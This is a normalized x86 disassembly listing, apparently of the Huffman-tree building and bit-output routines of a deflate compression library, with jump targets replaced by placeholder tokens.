mov eax 0x10
sub eax edx
cmp ecx eax
mov eax [ r--data ]
jle r-xdata
push esi
call sub_10013980
add esp 0x4
sub_10012390
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi [ esp + 0x10 ]
xor eax eax
push edi
mov ecx [ esi + 0x7c ]
test ecx ecx
jle r-xdata
lea ecx [ ebp + 0x5 ]
cmp [ esi + 0x1c ] 0x2
jne r-xdata
cmp ecx edx
mov ecx [ esi + 0x16b4 ]
jne r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
lea eax [ esi + 0xb10 ]
push eax
push esi
call sub_10012580
lea ecx [ esi + 0xb1c ]
push ecx
push esi
call sub_10012580
push esi
call sub_10012b50
mov edx [ esi + 0x16a0 ]
mov ecx [ esi + 0x16a4 ]
add edx 0xa
add ecx 0xa
shr edx 0x3
shr ecx 0x3
add esp 0x14
cmp ecx edx
ja r-xdata
push esi
call sub_100138e0
add esp 0x4
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea edx [ edi + 0x4 ]
jle r-xdata
mov edi [ esp + 0x20 ]
cmp ecx 0xd
lea eax [ edi + 0x2 ]
jle r-xdata
mov edi [ esp + 0x20 ]
push edi
push ebp
push ebx
push esi
call sub_10012090
add esp 0x10
jmp r-xdata
lea edi [ ebp + 0x4 ]
cmp edi edx
ja r-xdata
jmp r-xdata
shl edx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov ebx edx
mov ebp [ esi + 0x8 ]
shl ebx cl
or [ esi + 0x16b0 ] bx
mov ebx [ esi + 0x14 ]
mov cl [ esi + 0x16b0 ]
mov [ ebx + ebp ] cl
mov ebx [ esi + 0x14 ]
mov ebp [ esi + 0x8 ]
inc ebx
mov [ esi + 0x14 ] ebx
mov ecx ebx
xor ebx ebx
mov bl [ esi + 0x16b1 ]
mov [ ecx + ebp ] bl
mov ecx [ esi + 0x14 ]
mov ebx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx bx
shr dx cl
add ebx 0xfffffff3
mov [ esi + 0x16b4 ] ebx
mov [ esi + 0x16b0 ] dx
jmp r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x8 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x14 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ebx + ecx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
push esi
call sub_10012020
add esp 0x4
test edi edi
je r-xdata
mov edx ecx
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
call sub_10013a10
add esp 0x4
mov ecx [ esi + 0xb14 ]
inc eax
push eax
mov eax [ esi + 0xb20 ]
inc eax
inc ecx
push eax
push ecx
push esi
call sub_10012cb0
lea edx [ esi + 0x980 ]
lea eax [ esi + 0x8c ]
push edx
push eax
push esi
call sub_100134a0
add esp 0x1c
push r--data
push r--data
push esi
call sub_100134a0
add esp 0xc
jmp r-xdata
sub_10012580
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ eax ]
mov eax [ eax + 0x8 ]
or ebp 0xffffffff
mov ebx [ eax ]
mov ecx [ eax + 0xc ]
xor eax eax
mov [ esp + 0x14 ] ecx
cmp ecx eax
mov [ esp + 0x10 ] ebp
mov [ esi + 0x1448 ] eax
mov [ esi + 0x144c ] 0x23d
jle r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jge r-xdata
mov edx edi
mov edx [ esp + 0x20 ]
mov [ edx + 0x4 ] ebp
mov eax [ esi + 0x1448 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp ebx 0x1
jl r-xdata
cmp ebp 0x2
jge r-xdata
mov [ edx + 0x2 ] 0x0
mov ecx [ esi + 0x1448 ]
mov [ esp + 0x10 ] eax
inc ecx
mov ebp eax
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ eax + esi + 0x1450 ] 0x0
jmp r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] eax
lea eax [ edi + eax * 4 ]
mov [ esp + 0x1c ] eax
push ebx
push edi
push esi
call sub_100127c0
add esp 0xc
dec ebx
cmp ebx 0x1
jge r-xdata
xor eax eax
inc ebp
mov eax ebp
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
and ecx 0xff
mov eax ecx
and eax 0xff
jmp r-xdata
mov ecx [ esi + 0x1448 ]
cmp ecx 0x2
jl r-xdata
xor ecx ecx
mov cx [ ebx + eax * 4 + 0x2 ]
mov eax [ esi + 0x16a4 ]
sub eax ecx
mov [ esi + 0x16a4 ] eax
inc ecx
mov [ esi + 0x1448 ] ecx
mov [ esi + ecx * 4 + 0xb54 ] eax
mov [ edi + eax * 4 ] 0x1
mov [ esi + eax + 0x1450 ] 0x0
mov edx [ esi + 0x16a0 ]
dec edx
test ebx ebx
mov [ esi + 0x16a0 ] edx
je r-xdata
mov eax [ esi + 0x1448 ]
mov ebx [ esi + 0xb58 ]
push 0x1
push edi
mov ecx [ esi + eax * 4 + 0xb54 ]
dec eax
push esi
mov [ esi + 0xb58 ] ecx
mov [ esi + 0x1448 ] eax
call sub_100127c0
mov edx [ esi + 0x144c ]
mov ebp [ esi + 0xb58 ]
add esp 0xc
dec edx
mov eax edx
mov [ esi + 0x144c ] edx
mov [ esi + eax * 4 + 0xb54 ] ebx
mov ecx [ esi + 0x144c ]
dec ecx
mov eax ecx
mov [ esi + 0x144c ] ecx
mov [ esi + eax * 4 + 0xb54 ] ebp
mov dx [ edi + ebp * 4 ]
add dx [ edi + ebx * 4 ]
mov eax [ esp + 0x1c ]
mov [ eax ] dx
mov al [ esi + ebx + 0x1450 ]
mov cl [ esi + ebp + 0x1450 ]
cmp al cl
jb r-xdata
mov edx [ esi + 0x144c ]
mov ecx [ esi + 0xb58 ]
dec edx
mov [ esi + 0x144c ] edx
mov eax edx
mov edx [ esp + 0x20 ]
push edx
push esi
mov [ esi + eax * 4 + 0xb54 ] ecx
call sub_100128a0
mov eax [ esp + 0x18 ]
add esi 0xb34
push esi
push eax
push edi
call sub_10012ad0
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
inc al
push 0x1
push edi
mov [ esi + ecx + 0x1450 ] al
mov eax [ esp + 0x24 ]
mov [ edi + ebp * 4 + 0x2 ] cx
mov [ edi + ebx * 4 + 0x2 ] cx
mov [ esi + 0xb58 ] ecx
inc ecx
add eax 0x4
push esi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x28 ] eax
call sub_100127c0
mov eax [ esi + 0x1448 ]
add esp 0xc
cmp eax 0x2
jge r-xdata
mov [ esp + 0x10 ] ebp
sub_100127c0
mov eax [ esp + 0x4 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
mov edx [ eax + 0x1448 ]
push edi
mov ebp [ eax + esi * 4 + 0xb54 ]
lea ecx [ esi + esi ]
cmp ecx edx
mov [ esp + 0x14 ] ebp
jg r-xdata
mov [ eax + esi * 4 + 0xb54 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x18 ]
mov esi [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + ebp * 4 ]
mov bx [ edi + esi * 4 ]
cmp dx bx
jb r-xdata
mov esi [ eax + ecx * 4 + 0xb58 ]
mov ebp [ eax + ecx * 4 + 0xb54 ]
mov dx [ edi + esi * 4 ]
mov bx [ edi + ebp * 4 ]
cmp dx bx
jb r-xdata
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + ecx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
jne r-xdata
inc ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0x1c ] ecx
shl ecx 0x1
mov [ eax + edx * 4 + 0xb54 ] esi
mov edx [ eax + 0x1448 ]
cmp ecx edx
jle r-xdata
mov dl [ eax + ebp + 0x1450 ]
mov bl [ esi + eax + 0x1450 ]
cmp dl bl
jbe r-xdata
mov ebp [ esp + 0x14 ]
mov dl [ esi + eax + 0x1450 ]
mov bl [ eax + ebp + 0x1450 ]
cmp dl bl
ja r-xdata
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
mov [ eax + edx * 4 + 0xb54 ] ebp
pop ebp
pop ebx
retn
sub_100128a0
sub esp 0x1c
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov ebx [ eax ]
mov ecx [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
mov [ esp + 0x18 ] ecx
push edi
xor esi esi
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov ebp [ eax + 0x10 ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x30 ]
mov ecx 0x8
xor eax eax
lea edi [ edx + 0xb34 ]
mov [ esp + 0x10 ] esi
[ edi ]
mov eax [ edx + 0x144c ]
mov [ esp + 0x28 ] ebp
mov ecx [ edx + eax * 4 + 0xb54 ]
mov [ ebx + ecx * 4 + 0x2 ] si
mov esi [ edx + 0x144c ]
inc esi
cmp esi 0x23d
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
lea eax [ edx + esi * 4 + 0xb54 ]
mov [ esp + 0x30 ] eax
mov eax 0x23d
sub eax esi
add esi eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x34 ] esi
mov edi [ esp + 0x1c ]
mov [ ebx + ecx * 4 + 0x2 ] ax
cmp ecx edi
jg r-xdata
mov edi [ esp + 0x10 ]
mov eax ebp
inc edi
mov [ esp + 0x10 ] edi
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
add ecx 0x4
dec eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x18 ] eax
jne r-xdata
mov esi [ esp + 0x20 ]
inc [ edx + eax * 2 + 0xb34 ]
xor edi edi
cmp ecx esi
jl r-xdata
mov ecx [ esp + 0x30 ]
xor eax eax
xor edi edi
mov ecx [ ecx ]
mov ax [ ebx + ecx * 4 + 0x2 ]
mov di [ ebx + eax * 4 + 0x2 ]
mov eax edi
inc eax
cmp eax ebp
jle r-xdata
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov si [ ebx + ecx * 4 ]
add eax edi
and esi 0xffff
imul eax esi
add [ edx + 0x16a0 ] eax
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edi ecx
sub edi esi
mov esi [ esp + 0x24 ]
mov edi [ esi + edi * 4 ]
lea eax [ ebp - 0x1 ]
cmp [ edx + eax * 2 + 0xb34 ] 0x0
lea ecx [ edx + eax * 2 + 0xb34 ]
jne r-xdata
mov esi [ esp + 0x34 ]
mov ebp [ esp + 0x14 ]
xor eax eax
mov ax [ ebp + ecx * 4 + 0x2 ]
mov ecx [ edx + 0x16a4 ]
add eax edi
mov ebp [ esp + 0x28 ]
imul eax esi
add ecx eax
mov [ edx + 0x16a4 ] ecx
dec [ edx + eax * 2 + 0xb34 ]
add [ edx + eax * 2 + 0xb36 ] 0x2
dec [ edx + ebp * 2 + 0xb34 ]
sub edi 0x2
test edi edi
jg r-xdata
sub ecx 0x2
dec eax
cmp [ ecx ] 0x0
je r-xdata
test ebp ebp
mov edi ebp
je r-xdata
lea ebp [ edx + ebp * 2 + 0xb34 ]
mov [ esp + 0x18 ] ebp
mov ebp [ esp + 0x18 ]
dec edi
sub ebp 0x2
test edi edi
mov [ esp + 0x18 ] ebp
jne r-xdata
lea ebp [ edx + esi * 4 + 0xb54 ]
xor eax eax
mov ax [ ebp ]
test eax eax
mov [ esp + 0x30 ] eax
je r-xdata
test eax eax
jne r-xdata
lea esi [ ebx + ecx * 4 + 0x2 ]
xor eax eax
mov ax [ esi ]
cmp eax edi
je r-xdata
mov esi [ esp + 0x34 ]
mov ecx [ ebp - 0x4 ]
dec esi
sub ebp 0x4
mov [ esp + 0x34 ] esi
mov esi [ esp + 0x1c ]
cmp ecx esi
mov [ esp + 0x28 ] ebp
jg r-xdata
mov esi [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
dec eax
mov [ esp + 0x30 ] eax
mov ebp edi
sub ebp eax
xor eax eax
mov ax [ ebx + ecx * 4 ]
imul ebp eax
mov eax [ edx + 0x16a0 ]
add eax ebp
mov ebp [ esp + 0x28 ]
mov [ edx + 0x16a0 ] eax
mov [ esi ] di
sub_10012ad0
mov edx [ esp + 0xc ]
sub esp 0x20
xor eax eax
lea ecx [ esp + 0x2 ]
push esi
lea esi [ esp + 0x6 ]
sub edx esi
push edi
mov esi 0xf
mov di [ edx + ecx ]
add ecx 0x2
add di ax
shl edi 0x1
mov eax edi
dec esi
mov [ ecx - 0x2 ] ax
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jl r-xdata
pop edi
pop esi
add esp 0x20
retn
mov esi [ esp + 0x2c ]
lea edi [ eax + 0x1 ]
add esi 0x4
dec edi
jne r-xdata
mov dx [ esp + ecx * 2 + 0x8 ]
push ecx
mov eax edx
and eax 0xffff
inc edx
push eax
mov [ esp + ecx * 2 + 0x10 ] dx
call sub_10013960
add esp 0x8
mov [ esi ] ax
xor ecx ecx
mov cx [ esi + 0x2 ]
test ecx ecx
je r-xdata
sub_10012b50
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xb14 ]
lea ecx [ esi + 0x8c ]
push eax
push ecx
push esi
call sub_10012bc0
mov edx [ esi + 0xb20 ]
lea eax [ esi + 0x980 ]
push edx
push eax
push esi
call sub_10012bc0
lea ecx [ esi + 0xb28 ]
push ecx
push esi
call sub_10012580
add esp 0x20
mov eax 0x12
mov edx [ esi + 0x16a0 ]
lea ecx [ eax + eax * 2 + 0x11 ]
add edx ecx
mov [ esi + 0x16a0 ] edx
pop esi
retn
dec eax
cmp eax 0x3
jge r-xdata
xor edx edx
mov dl [ eax + r--data ]
cmp [ esi + edx * 4 + 0xa76 ] 0x0
jne r-xdata
sub_10012bc0
push ecx
mov eax [ esp + 0xc ]
push ebx
xor ecx ecx
push esi
mov cx [ eax + 0x2 ]
push edi
xor edi edi
mov [ esp + 0xc ] 0xffffffff
test ecx ecx
mov edx 0x7
mov esi 0x4
jne r-xdata
mov ebx [ esp + 0x1c ]
test ebx ebx
mov [ eax + ebx * 4 + 0x6 ] 0xffff
jl r-xdata
mov edx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
pop ecx
retn
inc ebx
push ebp
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
lea ebp [ eax + 0x6 ]
cmp edi esi
jge r-xdata
cmp eax ecx
je r-xdata
test eax eax
je r-xdata
add [ ebx + eax * 4 + 0xa74 ] di
jmp r-xdata
mov eax [ esp + 0x1c ]
add ebp 0x4
dec eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp edi 0xa
jg r-xdata
cmp eax [ esp + 0x10 ]
je r-xdata
xor edi edi
mov [ esp + 0x10 ] eax
test ecx ecx
jne r-xdata
mov eax ecx
xor ecx ecx
mov cx [ ebp ]
inc edi
cmp edi edx
jge r-xdata
pop ebp
inc [ ebx + 0xabc ]
inc [ ebx + 0xab8 ]
jmp r-xdata
inc [ ebx + 0xab4 ]
jmp r-xdata
inc [ ebx + eax * 4 + 0xa74 ]
cmp eax ecx
jne r-xdata
mov edx 0x8a
mov esi 0x3
jmp r-xdata
mov edx 0x7
mov esi 0x4
mov edx 0x6
mov esi 0x3
jmp r-xdata
sub_10012cb0
push ebx
push ebp
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
add eax 0xfffffeff
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
add eax 0xfffffeff
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov eax [ esp + 0x1c ]
dec eax
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x5
mov [ esi + 0x16b4 ] ecx
mov edx [ esp + 0x1c ]
lea eax [ edx - 0x1 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov ecx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
xor edx edx
mov dl [ esi + 0x16b1 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov [ ecx + edi ] dl
mov edx [ esi + 0x16b4 ]
mov ebp [ esi + 0x14 ]
mov cx 0x10
sub cx dx
inc ebp
shr ax cl
add edx 0xfffffff5
mov [ esi + 0x14 ] ebp
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xb
jle r-xdata
shl eax cl
or [ esi + 0x16b0 ] ax
add ecx 0x4
mov [ esi + 0x16b4 ] ecx
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov edi [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + edi ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff4
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
mov ecx [ esi + 0x16b4 ]
mov ebp [ esp + 0x20 ]
cmp ecx 0xc
lea eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ esp + 0x18 ]
lea ecx [ esi + 0x8c ]
dec eax
push eax
push ecx
push esi
call sub_10012f20
mov edx [ esp + 0x28 ]
lea eax [ esi + 0x980 ]
dec edx
push edx
push eax
push esi
call sub_10012f20
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
xor edi edi
test ebp ebp
jle r-xdata
xor eax eax
mov al [ edi + r--data ]
mov dx [ esi + eax * 4 + 0xa76 ]
shl dx cl
or [ esi + 0x16b0 ] dx
add ecx 0x3
mov [ esi + 0x16b4 ] ecx
xor edx edx
xor eax eax
mov dl [ edi + r--data ]
mov ax [ esi + edx * 4 + 0xa76 ]
mov edx eax
shl edx cl
mov ecx [ esi + 0x14 ]
or [ esi + 0x16b0 ] dx
mov edx [ esi + 0x8 ]
mov bl [ esi + 0x16b0 ]
mov [ ecx + edx ] bl
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x8 ]
inc edx
mov [ esi + 0x14 ] edx
mov ecx edx
xor edx edx
mov dl [ esi + 0x16b1 ]
mov [ ecx + ebx ] dl
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x16b4 ]
inc ecx
mov [ esi + 0x14 ] ecx
mov cx 0x10
sub cx dx
shr ax cl
add edx 0xfffffff3
mov [ esi + 0x16b4 ] edx
mov [ esi + 0x16b0 ] ax
jmp r-xdata
inc edi
cmp edi ebp
jl r-xdata
sub_10012f20
sub esp 0x8
mov eax [ esp + 0x10 ]
push ebx
xor ebx ebx
xor edx edx
mov bx [ eax + 0x2 ]
push esi
test ebx ebx
push edi
mov [ esp + 0xc ] 0xffffffff
mov ecx 0x7
mov esi 0x4
jne r-xdata
mov edi [ esp + 0x20 ]
test edi edi
jl r-xdata
mov ecx 0x8a
mov esi 0x3
pop edi
pop esi
pop ebx
add esp 0x8
retn
add eax 0x6
inc edi
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x18 ]
push ebp
mov [ esp + 0x14 ] edi
cmp edx esi
jge r-xdata
cmp ebp ebx
je r-xdata
test ebp ebp
je r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ebp [ esp + 0x24 ]
mov edi [ esp + 0x14 ]
add ebp 0x4
dec edi
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] edi
jne r-xdata
cmp edx 0xa
jg r-xdata
cmp ebp [ esp + 0x10 ]
je r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov edi [ esp + 0x24 ]
mov ebp ebx
xor ebx ebx
inc edx
mov bx [ edi ]
cmp edx ecx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] edx
jge r-xdata
pop ebp
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xabe ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xaba ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + 0xab6 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
mov ecx [ eax + 0x16b4 ]
xor esi esi
mov si [ eax + ebp * 4 + 0xa76 ]
mov edi 0x10
sub edi esi
cmp ecx edi
jle r-xdata
jmp r-xdata
dec edx
mov [ esp + 0x20 ] edx
jne r-xdata
mov di [ eax + 0xabc ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xabc ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab8 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab8 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + 0xab4 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + 0xab4 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov di [ eax + ebp * 4 + 0xa74 ]
shl di cl
or [ eax + 0x16b0 ] di
add ecx esi
mov [ eax + 0x16b4 ] ecx
xor edx edx
mov dx [ eax + ebp * 4 + 0xa74 ]
mov edi edx
shl edi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] di
mov edi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + edi ] bl
mov edi [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc edi
mov [ eax + 0x14 ] edi
mov [ edi + ebx ] cl
mov ecx [ eax + 0x14 ]
mov edi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx di
shr dx cl
mov [ eax + 0x16b0 ] dx
lea edx [ edi + esi - 0x10 ]
mov [ eax + 0x16b4 ] edx
mov edx [ esp + 0x20 ]
jmp r-xdata
mov ebx [ esp + 0x1c ]
xor edx edx
test ebx ebx
mov [ esp + 0x10 ] ebp
jne r-xdata
add edx 0xfffffff5
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x7
add edx 0xfffffff5
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff7
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0x9
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x3
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
mov ecx [ eax + 0x14 ]
mov esi [ eax + 0x16b4 ]
inc ecx
mov [ eax + 0x14 ] ecx
mov cx 0x10
sub cx si
shr dx cl
add esi 0xfffffff3
mov [ eax + 0x16b4 ] esi
mov [ eax + 0x16b0 ] dx
jmp r-xdata
mov ecx [ eax + 0x16b4 ]
cmp ecx 0xd
jle r-xdata
add edx 0xfffffffd
shl edx cl
or [ eax + 0x16b0 ] dx
add ecx 0x2
jmp r-xdata
add edx 0xfffffffd
mov esi edx
shl esi cl
mov ecx [ eax + 0x8 ]
or [ eax + 0x16b0 ] si
mov esi [ eax + 0x14 ]
mov bl [ eax + 0x16b0 ]
mov [ ecx + esi ] bl
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x16b1 ]
inc esi
mov [ eax + 0x14 ] esi
mov [ esi + edi ] cl
